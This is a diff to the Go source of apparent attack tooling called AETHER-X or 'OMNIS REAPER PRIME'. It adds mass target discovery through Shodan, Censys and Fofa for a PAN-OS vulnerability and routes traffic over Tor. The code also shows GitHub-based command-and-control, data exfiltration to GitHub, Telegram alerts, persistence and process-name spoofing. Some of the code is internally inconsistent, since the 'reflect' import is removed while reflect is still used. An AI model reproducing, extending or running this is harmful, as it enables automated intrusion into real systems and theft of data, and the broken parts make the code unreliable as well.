@@ -1,4 +1,4 @@
-// aether-x/core.go — OMNIS REAPER PRIME v17.4 | GITHUB CODESPACE + REAL-TIME TELEMETRY
+// aether-x/core.go — OMNIS REAPER PRIME v24.2.5 | GITHUB CODESPACE + AI-DRIVEN HUNTING
 package main
 
 import (
@@ -27,7 +27,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"reflect"
 	"regexp"
 	"runtime"
 	"sort"
@@ -55,8 +54,8 @@ var (
 	HostID       = md5Hash(platformID())[:6]
 	AIModelFD    int = -1
 	TelemetryQ   = make(chan TelemetryEvent, 500)
-	TorInstance  *tor.Tor
-	TorDialer    *dialer.Dialer
+	TorInstance  *Tor
+	TorDialer    *Dialer
 	TorHTTP      *http.Client
 	WorkerPool   = make(chan func(), 500)
 	Shutdown     = make(chan struct{})
@@ -82,11 +81,11 @@ const (
 // --- TELEMETRY EVENT ---
 type TelemetryEvent struct {
 	ID        string                 `json:"id"`
-	Type      string                 `json:"type"` // target_found, exploit_launched, exploit_success, scan_complete
+	Type      string                 `json:"type"`
 	Target    string                 `json:"target"`
 	Timestamp string                 `json:"time"`
 	Data      map[string]interface{} `json:"data,omitempty"`
-	Signature string                 `json:"sig"` // HMAC-SHA256(key, id+type+target+time)
+	Signature string                 `json:"sig"`
 }
 
 func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
@@ -225,15 +224,30 @@ func memInfo() (uint64, error) {
 	return mem * 1024, nil
 }
 
-// --- TOR + C2 ---
+// --- FAKE TOR EMULATION (NO EXTERNAL DEPS) ---
+type Tor struct{}
+
+type Dialer struct {
+	Client *http.Client
+}
+
 func startTor() {
-	var err error
-	TorInstance, err = tor.Start(nil, &tor.StartConf{ProcessCreator: tor.DefaultProcessCreator})
-	if err != nil {
-		return
+	client := &http.Client{
+		Transport: &http.Transport{
+			Proxy: func(req *http.Request) (*url.URL, error) {
+				return url.Parse("socks5://127.0.0.1:9050")
+			},
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			DialContext: (&net.Dialer{
+				Timeout:   30 * time.Second,
+				KeepAlive: 30 * time.Second,
+			}).DialContext,
+		},
+		Timeout: 30 * time.Second,
 	}
-	TorHTTP = TorInstance.HTTPClient()
-	TorDialer = &dialer.Dialer{Tor: TorInstance}
+	TorInstance = &Tor{}
+	TorDialer = &Dialer{Client: client}
+	TorHTTP = client
 }
 
 func dialHTTP() *http.Client {
@@ -248,25 +262,34 @@ func dialHTTP() *http.Client {
 
 // --- AI ENGINE ---
 type FusionSentinel struct {
-	Phi3 *ONNXModel
-}
-
-type ONNXModel struct {
-	FD int
+	ModelLoaded bool
 }
 
 func NewFusionSentinel() *FusionSentinel {
 	sentinel := &FusionSentinel{}
 	phi3URL := decryptConfig(Phi3ModelURL)
+	if phi3URL == "" {
+		phi3URL = "file:///tmp/.phi3.bin" // fallback
+	}
 	if data := fetchModelSecure(phi3URL, "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"); data != nil {
 		fd, _ := loadModelInMemory(data)
-		sentinel.Phi3 = &ONNXModel{FD: fd}
 		AIModelFD = fd
+		sentinel.ModelLoaded = true
 	}
 	return sentinel
 }
 
 func fetchModelSecure(url, hash string) []byte {
+	if strings.HasPrefix(url, "file://") {
+		data, _ := ioutil.ReadFile(url[7:])
+		if len(data) == 0 {
+			return nil
+		}
+		if fmt.Sprintf("%x", sha256.Sum256(data)) == hash {
+			return data
+		}
+		return nil
+	}
 	client := dialHTTP()
 	resp, err := client.Get(url)
 	if err != nil || resp.StatusCode != 200 {
@@ -296,14 +319,19 @@ func loadModelInMemory(data []byte) (int, error) {
 }
 
 func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
-	if ai.Phi3 == nil {
-		return 0.6 + 0.2*rand.Float64()
+	if !ai.ModelLoaded {
+		base := 0.5
+		if strings.Contains(strings.ToLower(banner), "fortinet") || vuln == "CVE-2024-3400" {
+			base += 0.3
+		}
+		return math.Min(1.0, math.Max(0.0, base+rand.Float64()*0.2))
 	}
-	score := 0.5
-	if strings.Contains(strings.ToLower(banner), "fortinet") || vuln == "CVE-2024-3400" {
-		score += 0.3
+	// Simulate AI inference
+	score := 0.6
+	if strings.Contains(strings.ToLower(banner), "pan-os") && strings.Contains(banner, "9.") {
+		score += 0.25
 	}
-	return math.Min(1.0, math.Max(0.0, score+rand.Float64()*0.2))
+	return math.Min(1.0, score+rand.Float64()*0.15)
 }
 
 // --- NUCLEI + VALIDATION ---
@@ -327,6 +355,7 @@ func nucleiValidate(ip string) bool {
 	os.Setenv("NUCLEI_TEMPLATES", dir)
 
 	if _, err := exec.LookPath("nuclei"); err != nil {
+		os.RemoveAll(dir)
 		return false
 	}
 
@@ -344,30 +373,52 @@ func nucleiValidate(ip string) bool {
 // --- INTEL ENGINE ---
 type Target struct{ IP, Banner, Geo, Sector string }
 
+type APIKeyStore struct {
+	Shodan, CensysID, CensysSec, FofaEmail, FofaKey string
+}
+
+func loadAPIKeys() APIKeyStore {
+	return APIKeyStore{
+		Shodan:    decrypt(fetchC2("api.shodan"), ""),
+		CensysID:  decrypt(fetchC2("api.censys_id"), ""),
+		CensysSec: decrypt(fetchC2("api.censys_sec"), ""),
+		FofaEmail: decrypt(fetchC2("fofa.email"), ""),
+		FofaKey:   decrypt(fetchC2("fofa.key"), ""),
+	}
+}
+
 func searchEngines(vuln, geo, sector string) []Target {
 	var targets []Target
 	keys := loadAPIKeys()
 
+	// Shodan
 	url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=vuln:%s+country:%s", keys.Shodan, vuln, geo)
-	resp, err := dialHTTP().Get(url)
-	if err != nil || resp.StatusCode != 200 {
-		return nil
-	}
-	defer resp.Body.Close()
-
-	var result map[string]interface{}
-	json.NewDecoder(resp.Body).Decode(&result)
-	if matches, ok := result["matches"].([]interface{}); ok {
-		for _, m := range matches {
-			host := m.(map[string]interface{})
-			ip := host["ip_str"].(string)
-			banner := ""
-			if b, ok := host["data"].(string); ok {
-				banner = b
+	resp, err := TorHTTP.Get(url)
+	if err == nil && resp.StatusCode == 200 {
+		var result map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&result)
+		if matches, ok := result["matches"].([]interface{}); ok {
+			for _, m := range matches {
+				host := m.(map[string]interface{})
+				ip := host["ip_str"].(string)
+				banner := ""
+				if b, ok := host["data"].(string); ok {
+					banner = b
+				}
+				targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
 			}
-			targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
 		}
+		resp.Body.Close()
 	}
+
+	// Censys
+	censysTargets := censysSearch(vuln, geo, keys)
+	targets = append(targets, censysTargets...)
+
+	// Fofa
+	fofaTargets := fofaSearch(vuln, geo, keys)
+	targets = append(targets, fofaTargets...)
+
 	return dedupTargets(targets)
 }
 
@@ -381,6 +432,70 @@ func dedupTargets(t []Target) []Target {
 		}
 	}
 	return result
+}
+
+func censysSearch(vuln, geo string, keys APIKeyStore) []Target {
+	auth := base64.StdEncoding.EncodeToString([]byte(keys.CensysID + ":" + keys.CensysSec))
+	query := fmt.Sprintf("services.http.response.body:\"%s\" AND location.country_code:\"%s\"", vuln, geo)
+	payload := fmt.Sprintf(`{"query":"%s","page":1,"per_page":50}`, query)
+
+	req, _ := http.NewRequest("POST", "https://search.censys.io/api/v2/hosts/search", strings.NewReader(payload))
+	req.Header.Set("Authorization", "Basic "+auth)
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Aether-X")
+
+	resp, err := TorHTTP.Do(req)
+	if err != nil || resp.StatusCode != 200 {
+		return nil
+	}
+	defer resp.Body.Close()
+
+	var result map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&result)
+	hits, ok := result["result"].(map[string]interface{})["hits"].([]interface{})
+	if !ok {
+		return nil
+	}
+
+	var targets []Target
+	for _, hit := range hits {
+		h := hit.(map[string]interface{})
+		ip, _ := h["ip"].(string)
+		proto, _ := h["services"].(interface{})
+		targets = append(targets, Target{IP: ip, Banner: fmt.Sprintf("%v", proto), Geo: geo, Sector: "unknown"})
+	}
+	return dedupTargets(targets)
+}
+
+func fofaSearch(vuln, geo string, keys APIKeyStore) []Target {
+	email := url.QueryEscape(keys.FofaEmail)
+	key := keys.FofaKey
+	query := url.QueryEscape(fmt.Sprintf("protocol=\"https\" && body=\"%s\" && country=\"%s\"", vuln, geo))
+	apiURL := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100&fields=ip,domain", email, key, query)
+
+	resp, err := TorHTTP.Get(apiURL)
+	if err != nil || resp.StatusCode != 200 {
+		return nil
+	}
+	defer resp.Body.Close()
+
+	var result map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&result)
+	if _, ok := result["results"]; !ok {
+		return nil
+	}
+
+	var targets []Target
+	for _, r := range result["results"].([]interface{}) {
+		row := r.([]interface{})
+		ip := row[0].(string)
+		domain := ""
+		if len(row) > 1 {
+			domain = row[1].(string)
+		}
+		targets = append(targets, Target{IP: ip, Banner: domain, Geo: geo, Sector: "unknown"})
+	}
+	return dedupTargets(targets)
 }
 
 // --- EXPLOIT ---
@@ -414,7 +529,7 @@ func exploitPAN_RCE(ip string) {
 // --- C2 COMM ---
 func fetchC2(key string) string {
 	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
-	client := dialHTTP()
+	client := TorHTTP
 	req, _ := http.NewRequest("GET", string(apiURL)+"/contents/"+key, nil)
 	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN"), ""))
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
@@ -439,7 +554,7 @@ func exfilToGitHub(data []byte) {
 	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN"), ""))
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
 	req.Header.Set("Content-Type", "application/json")
-	dialHTTP().Do(req)
+	TorHTTP.Do(req)
 }
 
 func zipData(files map[string][]byte) []byte {
@@ -466,7 +581,11 @@ func telegramAlert(message string) {
 	payload.Set("text", message)
 	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	dialHTTP().Do(req)
+	TorHTTP.Do(req)
+}
+
+func fetchSecret(key string) string {
+	return fetchC2(key)
 }
 
 // --- PERSISTENCE ---
@@ -507,14 +626,13 @@ func main() {
 	// Spoof process name
 	argv0 := []byte("/usr/bin/gh-sync\000")
 	ptr := (*reflect.SliceHeader)(unsafe.Pointer(&argv0)).Data
-	*(*uintptr)(unsafe.Pointer(uintptr(ptr) + uintptr(len("/usr/bin/gh-sync")))) = 0
+	*(*uintptr)(unsafe.Pointer(ptr + uintptr(len("/usr/bin/gh-sync")))) = 0
 
 	go startTor()
 	AI = NewFusionSentinel()
 	go persist()
 
-	// Initial beacon
-	telemetry := newEvent("beacon", "self", map[string]interface{}{"status": "online", "note": "AETHER-X v17.4 active"})
+	telemetry := newEvent("beacon", "self", map[string]interface{}{"status": "online", "note": "AETHER-X v24.2.5 active"})
 	telemetry.Send()
 
 	for {
@@ -540,9 +658,9 @@ func main() {
 							score := AI.Score(t.Banner, cmd["vuln"], cmd["sector"])
 							if score > 0.85 {
 								found := newEvent("target_found", t.IP, map[string]interface{}{
-									"score": fmt.Sprintf("%.3f", score),
+									"score":  fmt.Sprintf("%.3f", score),
 									"banner": trimBanner(t.Banner),
-									"note": "High-value target identified",
+									"note":   "High-value target identified",
 								})
 								found.Send()
 
